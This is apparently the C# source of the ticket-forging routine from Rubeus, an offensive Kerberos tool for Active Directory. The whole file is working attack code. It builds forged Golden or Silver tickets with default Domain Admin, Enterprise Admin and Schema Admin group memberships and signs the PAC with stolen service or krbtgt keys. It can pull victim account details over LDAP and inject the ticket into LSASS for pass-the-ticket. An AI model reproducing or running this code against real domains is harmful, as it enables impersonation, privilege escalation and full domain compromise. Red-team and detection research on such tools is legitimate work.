using System;
using System.Text;
using System.Security.Principal;
using System.Collections.Generic;
using System.Linq;
using System.DirectoryServices;
using Rubeus.lib.Interop;
using Rubeus.Kerberos.PAC;
using Rubeus.Kerberos;

namespace Rubeus
{
    public class ForgeTickets
    {
        public static void ForgeTicket(string user, string sname, byte[] serviceKey, Interop.KERB_ETYPE etype, byte[] krbKey = null, Interop.KERB_CHECKSUM_ALGORITHM krbeType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256, bool ldap = false, System.Net.NetworkCredential ldapcred = null, string sid = "", string domain = "", string netbiosName = "", string domainController = "", int uid = 0, string groups = "", string sids = "", string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
        {
            // vars
            int c = 0;

            // initialise LogonInfo section and set defaults
            var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
            kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(user);
            kvi.FullName = new Ndr._RPC_UNICODE_STRING("");
            kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING("");
            kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING("");
            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING("");
            kvi.LogonScript = new Ndr._RPC_UNICODE_STRING("");
            kvi.LogonServer = new Ndr._RPC_UNICODE_STRING("");
            kvi.UserSessionKey = Ndr._USER_SESSION_KEY.CreateDefault();
            kvi.LogonTime = new Ndr._FILETIME(DateTime.UtcNow);
            kvi.LogoffTime = Ndr._FILETIME.CreateDefault();
            kvi.PasswordLastSet = Ndr._FILETIME.CreateDefault();
            kvi.KickOffTime = Ndr._FILETIME.CreateDefault();
            kvi.PasswordCanChange = Ndr._FILETIME.CreateDefault();
            kvi.PasswordMustChange = Ndr._FILETIME.CreateDefault();
            kvi.LogonCount = 0;
            kvi.BadPasswordCount = 0;
            kvi.UserId = 500;
            if (string.IsNullOrEmpty(groups))
            {
                kvi.GroupCount = 5;
                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[] {
                    new Ndr._GROUP_MEMBERSHIP(520, 0),
                    new Ndr._GROUP_MEMBERSHIP(512, 0),
                    new Ndr._GROUP_MEMBERSHIP(513, 0),
                    new Ndr._GROUP_MEMBERSHIP(519, 0),
                    new Ndr._GROUP_MEMBERSHIP(518, 0),
                };
            }
            kvi.UserAccountControl = 528;
            kvi.UserFlags = 32;
            if (String.IsNullOrEmpty(sids))
            {
                kvi.SidCount = 1;
                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
                        new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier("S-1-18-1")), 7)};
            }

            // Some 


            // determine domain if not supplied
            string[] parts = sname.Split('/');
            if (String.IsNullOrEmpty(domain))
            {
                if ((parts.Length > 1) && (parts[0] == "krbtgt"))
                {
                    Console.WriteLine("[X] TGT or referral TGT requires /domain to be passed.");
                    return;
                }
                else if ((parts.Length == 1) && (sname.Split('@').Length == 1))
                {
                    Console.WriteLine("[X] SPN has to be in the format 'svc/host.domain.com' or 'host@domain.com'.");
                    return;
                }
                else if (parts.Length > 1)
                {
                    domain = parts[1].Substring(parts[1].IndexOf('.') + 1);
                    string[] domainParts = domain.Split(':');
                    if (domainParts.Length > 1)
                    {
                        domain = domainParts[0];
                    }
                }
                else if (sname.Split('@').Length > 1)
                {
                    domain = sname.Split('@')[1];
                }
                else
                {
                    Console.WriteLine("[X] SPN is in a unsupported format: {0}.", sname);
                    return;
                }
            }

            // if /fromldap was passed make the LDAP queries
            if (ldap)
            {
                DirectoryEntry directoryObject = null;
                DirectorySearcher userSearcher = null;

                try
                {
                    if (String.IsNullOrEmpty(domainController))
                    {
                        domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
                    }
                    Console.WriteLine("[*] Retrieving user information over LDAP from domain controller {0}", domainController);
                    directoryObject = Networking.GetLdapSearchRoot(ldapcred, "", domainController, domain);
                    userSearcher = new DirectorySearcher(directoryObject);
                    // enable LDAP paged search to get all results, by pages of 1000 items
                    userSearcher.PageSize = 1000;
                }
                catch (Exception ex)
                {
                    if (ex.InnerException != null)
                    {
                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
                    }
                    return;
                }

                try
                {
                    string userSearchFilter = "";

                    userSearchFilter = String.Format("(samAccountName={0})", user);
                    userSearcher.Filter = userSearchFilter;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
                    return;
                }

                string domainDN = "";

                try
                {
                    SearchResultCollection users = userSearcher.FindAll();

                    if (users.Count == 0)
                    {
                        Console.WriteLine("[X] No users returned by LDAP!");
                        return;
                    }

                    foreach (SearchResult u in users)
                    {
                        // set account data from object attributes
                        domainDN = u.Properties["distinguishedname"][0].ToString().Substring(u.Properties["distinguishedname"][0].ToString().IndexOf("DC="));
                        if (u.Properties["homedirectory"].Count > 0)
                        {
                            kvi.FullName = new Ndr._RPC_UNICODE_STRING(u.Properties["displayname"][0].ToString());
                        }
                        string objectSid = (new SecurityIdentifier((byte[])u.Properties["objectsid"][0], 0)).Value;
                        string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));
                        if (String.IsNullOrEmpty(sid))
                        {
                            kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
                        }
                        kvi.LogonCount = short.Parse(u.Properties["logoncount"][0].ToString());
                        kvi.BadPasswordCount = short.Parse(u.Properties["badpwdcount"][0].ToString());
                        if (Int64.Parse(u.Properties["lastlogon"][0].ToString()) != 0)
                        {
                            kvi.LogonTime = new Ndr._FILETIME(DateTime.FromFileTimeUtc((long)u.Properties["lastlogon"][0]));
                        }
                        if (Int64.Parse(u.Properties["lastlogoff"][0].ToString()) != 0)
                        {
                            kvi.LogoffTime = new Ndr._FILETIME(DateTime.FromFileTimeUtc((long)u.Properties["lastlogoff"][0]));
                        }
                        if (Int64.Parse(u.Properties["pwdlastset"][0].ToString()) != 0)
                        {
                            kvi.PasswordLastSet = new Ndr._FILETIME(DateTime.FromFileTimeUtc((long)u.Properties["pwdlastset"][0]));
                        }
                        kvi.PrimaryGroupId = (int)u.Properties["primarygroupid"][0];
                        kvi.UserId = Int32.Parse(objectSid.Substring(objectSid.LastIndexOf('-')+1));
                        if (u.Properties["homedirectory"].Count > 0)
                        {
                            kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING(u.Properties["homedirectory"][0].ToString());
                        }
                        if (u.Properties["homedrive"].Count > 0)
                        {
                            kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING(u.Properties["homedrive"][0].ToString());
                        }
                        if (u.Properties["profilepath"].Count > 0)
                        {
                            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(u.Properties["profilepath"][0].ToString());
                        }
                        if (u.Properties["scriptpath"].Count > 0)
                        {
                            kvi.LogonScript = new Ndr._RPC_UNICODE_STRING(u.Properties["scriptpath"][0].ToString());
                        }

                        kvi.GroupCount = u.Properties["memberof"].Count;
                        kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[u.Properties["memberof"].Count];
                        c = 0;
                        if (u.Properties["memberof"].Count > 0)
                        {
                            // build the group membership search filter and reuse the usersearcher object
                            try
                            {
                                Console.WriteLine("[*] Retrieving group information over LDAP from domain controller {0}", domainController);
                                string groupSearchFilter = "";
                                foreach (string groupDN in u.Properties["memberof"])
                                {
                                    groupSearchFilter += String.Format("(distinguishedname={0})", groupDN);
                                }
                                userSearcher.Filter = String.Format("(|{0})", groupSearchFilter);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
                                return;
                            }

                            try
                            {
                                SearchResultCollection returnedGroups = userSearcher.FindAll();

                                if (returnedGroups.Count == 0)
                                {
                                    Console.WriteLine("[X] No groups returned by LDAP!");
                                    return;
                                }

                                // set the GroupIds field in the PAC from the group SIDs returned from LDAP
                                foreach (SearchResult g in returnedGroups)
                                {
                                    string groupSid = (new SecurityIdentifier((byte[])g.Properties["objectsid"][0], 0)).Value;
                                    int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, 7) }, 0, kvi.GroupIds, c, 1);
                                    c += 1;
                                }
                            }
                            catch (Exception ex)
                            {
                                if (ex.InnerException != null)
                                {
                                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                                }
                                else
                                {
                                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
                                }
                                return;
                            }
                        }

                        // Search for the NETBIOS name in LDAP if it isn't passed on the command line
                        if (String.IsNullOrEmpty(netbiosName))
                        {
                            try
                            {
                                Console.WriteLine("[*] Retrieving netbios name over LDAP from domain controller {0}", domainController);
                                directoryObject = Networking.GetLdapSearchRoot(ldapcred, String.Format("CN=Configuration,{0}", domainDN), domainController, domain);
                                userSearcher = new DirectorySearcher(directoryObject);
                                // enable LDAP paged search to get all results, by pages of 1000 items
                                userSearcher.PageSize = 1000;
                                userSearcher.Filter = "(netbiosname=*)";
                                SearchResultCollection netbios = userSearcher.FindAll();

                                if (netbios.Count == 0)
                                {
                                    Console.WriteLine("[X] No groups returned by LDAP!");
                                    return;
                                }

                                foreach (SearchResult n in netbios)
                                {
                                    kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(n.Properties["netbiosname"][0].ToString());
                                }
                            }
                            catch (Exception ex)
                            {
                                if (ex.InnerException != null)
                                {
                                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                                }
                                else
                                {
                                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
                                }
                                return;
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    if (ex.InnerException != null)
                    {
                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
                    }
                    return;
                }

            }
            else if (String.IsNullOrEmpty(netbiosName) || String.IsNullOrEmpty(sid))
            {
                Console.WriteLine("[X] To forge tickets without specifying '/ldap' both '/netbios' and '/sid' are required.");
                return;
            }

            // initialize some structures
            KRB_CRED cred = new KRB_CRED();
            KrbCredInfo info = new KrbCredInfo();

            Console.WriteLine("[*] Building PAC");

            // overwrite any LogonInfo fields here sections
            if (!String.IsNullOrEmpty(netbiosName))
            {
                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(netbiosName);
            }
            if (!String.IsNullOrEmpty(sid))
            {
                kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(sid));
            }
            if (!String.IsNullOrEmpty(groups))
            {
                int numOfGroups = groups.Split(',').Length;
                kvi.GroupCount = numOfGroups;
                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[numOfGroups];
                c = 0;
                foreach (string gid in groups.Split(','))
                {
                    try
                    {
                        Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(Int32.Parse(gid), 7) }, 0, kvi.GroupIds, c, 1);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[X] Error unable to parse group id {0}: {1}", gid, e.Message);
                    }
                    c += 1;
                }
            }
            if (!String.IsNullOrEmpty(sids))
            {
                int numOfSids = sids.Split(',').Length;
                kvi.SidCount = numOfSids;
                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[numOfSids];
                c = 0;
                foreach (string s in sids.Split(','))
                {
                    Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), 7) }, 0, kvi.ExtraSids, c, 1);
                    c += 1;
                }
            }
            if (!String.IsNullOrEmpty(domainController))
            {
                string dcName = Networking.GetDCNameFromIP(domainController);
                if (dcName != null)
                {
                    kvi.LogonServer = new Ndr._RPC_UNICODE_STRING(domainController.Substring(0, domainController.IndexOf('.')).ToUpper());
                }
            }
            LogonInfo li = new LogonInfo(kvi);


            ClientName cn = new ClientName(DateTime.UtcNow, user);
            SignatureData svrSigData = new SignatureData(PacInfoBufferType.ServerChecksum);
            SignatureData kdcSigData = new SignatureData(PacInfoBufferType.KDCChecksum);
            int svrSigLength = 12, kdcSigLength = 12;

            UpnDns upnDns = new UpnDns(1, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));

            // generate a random session key
            Random random = new Random();
            byte[] randKeyBytes;
            if (etype == Interop.KERB_ETYPE.rc4_hmac)
            {
                randKeyBytes = new byte[16];
                random.NextBytes(randKeyBytes);
                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                svrSigLength = 16;
                kdcSigLength = 16;
            }
            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                randKeyBytes = new byte[32];
                random.NextBytes(randKeyBytes);
                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
            }
            else
            {
                Console.WriteLine("[X] Only rc4_hmac and aes256_cts_hmac_sha1 key hashes supported at this time!");
                return;
            }

            // if the krbtgt key is specified, use the checksum type also specified
            if (krbKey != null)
            {
                kdcSigData.SignatureType = krbeType;
                if ((krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256) || (krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
                {
                    kdcSigLength = 12;
                }
                else
                {
                    kdcSigLength = 16;
                }
            }

            Console.WriteLine("[*] Generating EncTicketPart");
            EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, domain.ToUpper(), user, flags, cn.ClientId);

            // generate clear signatures
            Console.WriteLine("[*] Signing PAC");
            svrSigData.Signature = new byte[svrSigLength];
            kdcSigData.Signature = new byte[kdcSigLength];
            Array.Clear(svrSigData.Signature, 0, svrSigLength);
            Array.Clear(kdcSigData.Signature, 0, kdcSigLength);

            // set krbKey to serviceKey if none is given
            if (krbKey == null)
            {
                krbKey = serviceKey;
            }

            // add sections to the PAC, get bytes and generate checksums
            List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
            PacInfoBuffers.Add(li);
            PacInfoBuffers.Add(cn);
            PacInfoBuffers.Add(upnDns);
            PacInfoBuffers.Add(svrSigData);
            PacInfoBuffers.Add(kdcSigData);
            PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
            byte[] ptBytes = pt.Encode();
            byte[] svrSig = Crypto.KerberosChecksum(serviceKey, ptBytes, svrSigData.SignatureType);
            byte[] kdcSig = Crypto.KerberosChecksum(krbKey, svrSig, kdcSigData.SignatureType);

            // add checksums
            svrSigData.Signature = svrSig;
            kdcSigData.Signature = kdcSig;
            PacInfoBuffers = new List<PacInfoBuffer>();
            PacInfoBuffers.Add(li);
            PacInfoBuffers.Add(cn);
            PacInfoBuffers.Add(upnDns);
            PacInfoBuffers.Add(svrSigData);
            PacInfoBuffers.Add(kdcSigData);
            pt = new PACTYPE(0, PacInfoBuffers);

            // add the PAC to the ticket
            decTicketPart.SetPac(pt);


            // encrypt the EncTicketPart
            Console.WriteLine("[*] Encrypting EncTicketPart");
            byte[] encTicketData = decTicketPart.Encode().Encode();
            byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, serviceKey, encTicketData);

            // initialize the ticket and add the enc_part
            Console.WriteLine("[*] Generating Ticket");
            Ticket ticket = new Ticket(domain.ToUpper(), sname);
            ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);

            // add the ticket
            cred.tickets.Add(ticket);

            // [0] add in the session key
            info.key.keytype = (int)etype;
            info.key.keyvalue = randKeyBytes;

            // [1] prealm (domain)
            info.prealm = decTicketPart.crealm;

            // [2] pname (user)
            info.pname.name_type = decTicketPart.cname.name_type;
            info.pname.name_string = decTicketPart.cname.name_string;

            // [3] flags
            info.flags = flags;

            // [4] authtime (not required)
            info.authtime = decTicketPart.authtime;

            // [5] starttime
            info.starttime = decTicketPart.starttime;

            // [6] endtime
            info.endtime = decTicketPart.endtime;

            // [7] renew-till
            info.renew_till = decTicketPart.renew_till;

            // [8] srealm
            info.srealm = ticket.realm;

            // [9] sname
            info.sname.name_type = ticket.sname.name_type;
            info.sname.name_string = ticket.sname.name_string;

            // add the ticket_info into the cred object
            cred.enc_part.ticket_info.Add(info);

            Console.WriteLine("[*] Generated KERB-CRED");



            byte[] kirbiBytes = cred.Encode().Encode();

            string kirbiString = Convert.ToBase64String(kirbiBytes);

            if (parts[0] == "krbtgt")
            {
                Console.WriteLine("[*] Forged a TGT for '{0}@{1}'", info.pname.name_string[0], domain);
            }
            else
            {
                Console.WriteLine("[*] Forged a TGS for '{0}' to '{1}'", info.pname.name_string[0], sname);
            }
            Console.WriteLine("");

            // output some ticket information
            Console.WriteLine("[*] Domain         : {0} ({1})", ticket.realm, kvi.LogonDomainName);
            Console.WriteLine("[*] SID            : {0}", kvi.LogonDomainId?.GetValue());
            Console.WriteLine("[*] UserId         : {0}", kvi.UserId);
            Console.WriteLine("[*] Groups         : {0}", kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
            Console.WriteLine("[*] ServiceKey     : {0}", Helpers.ByteArrayToString(serviceKey));
            Console.WriteLine("[*] ServiceKeyType : {0}", svrSigData.SignatureType);
            Console.WriteLine("[*] KDCKey         : {0}", Helpers.ByteArrayToString(krbKey));
            Console.WriteLine("[*] KDCKeyType     : {0}", kdcSigData.SignatureType);
            Console.WriteLine("[*] Service        : {0}", parts[0]);
            Console.WriteLine("[*] Target         : {0}", parts[1]);
            var dateFormat = "dd/MM/yyyy HH:mm:ss";
            Console.WriteLine("[*] AuthTime       : {0}", decTicketPart.authtime.ToLocalTime().ToString(dateFormat));
            Console.WriteLine("[*] StartTime      : {0}", decTicketPart.starttime.ToLocalTime().ToString(dateFormat));
            Console.WriteLine("[*] EndTime        : {0}", decTicketPart.endtime.ToLocalTime().ToString(dateFormat));
            Console.WriteLine("[*] RenewTill      : {0}", decTicketPart.renew_till.ToLocalTime().ToString(dateFormat));
            Console.WriteLine("");

            Console.WriteLine("[*] base64(ticket.kirbi):\r\n");

            if (Program.wrapTickets)
            {
                // display the .kirbi base64, columns of 80 chararacters
                foreach (string line in Helpers.Split(kirbiString, 80))
                {
                    Console.WriteLine("      {0}", line);
                }
            }
            else
            {
                Console.WriteLine("      {0}", kirbiString);
            }

            Console.WriteLine("");

            if (!String.IsNullOrEmpty(outfile))
            {
                string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
                filename = Helpers.MakeValidFileName(filename);
                if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                {
                    Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
                }
            }

            if (ptt)
            {
                // pass-the-ticket -> import into LSASS
                LSA.ImportTicket(kirbiBytes, new LUID());
            }
        }
    }
}
